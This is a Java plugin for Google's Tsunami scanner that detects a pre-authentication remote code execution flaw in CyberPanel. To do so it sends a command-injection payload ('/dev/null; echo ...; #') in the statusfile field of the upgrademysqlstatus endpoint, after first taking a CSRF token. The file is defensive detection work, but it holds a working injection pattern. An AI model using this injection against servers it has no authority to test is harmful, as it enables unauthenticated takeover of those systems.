/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.cyberpanelpreauth;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.put;
import static java.util.Arrays.stream;

import com.google.common.collect.ImmutableList;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.ForWebService;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import java.util.Optional;
import javax.inject.Inject;

/** Detector for the Cyberpanel preauth RCE. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Cyberpanel preauth RCE",
    version = "0.1",
    description = "Detector for Cyberpanel preauth RCE.",
    author = "Pierre Precourt (pprecourt@google.com)",
    bootstrapModule = CyberpanelPreauthRceDetectorBootstrapModule.class)
@ForWebService
public final class CyberpanelPreauthRceDetector implements VulnDetector {
  private static final String PAYLOAD = "echo tsunami$((1250+50*2))";
  private static final String EXPECTED_RESPONSE = "tsunami1350";

  private final Clock utcClock;
  private final HttpClient httpClient;

  @Inject
  CyberpanelPreauthRceDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private Optional<String> getCsrfCookie(NetworkService networkService) {
    var rootUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);

    try {
      var response = httpClient.send(get(rootUrl).withEmptyHeaders().build());
      var body = response.bodyString();

      if (!response.status().isSuccess() || body.isEmpty()) {
        return Optional.empty();
      }

      if (!body.orElse("").contains("Login to your CyberPanel Account")) {
        return Optional.empty();
      }

      return response.headers().getAll("Set-Cookie").stream()
          .flatMap(headerVal -> stream(headerVal.split(";")))
          .filter(cookie -> cookie.contains("csrftoken"))
          .map(cookie -> cookie.split("=", 2)[1])
          .findFirst();
    } catch (IOException e) {
      return Optional.empty();
    }
  }

  private boolean isInstanceVulnerable(NetworkService networkService, String token) {
    var targetUrl =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
            + "dataBases/upgrademysqlstatus";
    var payload =
        String.format("{\"statusfile\":\"/dev/null; %s; #\",\"csrftoken\":\"%s\"}", PAYLOAD, token);
    var httpHeaders =
        HttpHeaders.builder()
            .addHeader("Content-Type", "application/json")
            .addHeader("X-CSRFToken", token)
            .addHeader("Cookie", "csrftoken=" + token)
            .addHeader("Referer", targetUrl)
            .build();

    try {
      var response =
          httpClient.send(
              put(targetUrl)
                  .setHeaders(httpHeaders)
                  .setRequestBody(ByteString.copyFromUtf8(payload))
                  .build());
      var jsonElement = response.bodyJson();

      if (!response.status().isSuccess() || jsonElement.isEmpty()) {
        return false;
      }

      return jsonElement
          .get()
          .getAsJsonObject()
          .get("requestStatus")
          .getAsString()
          .contains(EXPECTED_RESPONSE);
    } catch (IOException e) {
      return false;
    }
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    var token = getCsrfCookie(networkService);
    if (token.isEmpty()) {
      return false;
    }

    return isInstanceVulnerable(networkService, token.get());
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("GOOGLE")
                        .setValue("CYBERPANEL_PREAUTH_RCE"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Cyberpanel is vulnerable to pre-authentication remote code execution")
                .setDescription(
                    "The instance of Cyberpanel is vulnerable to pre-authentication remote code"
                        + " execution.")
                .setRecommendation(
                    "This is an unpatched vulnerability, we recommend temporarily firewalling the"
                        + " instance and apply a patch as soon as it is available."))
        .build();
  }
}
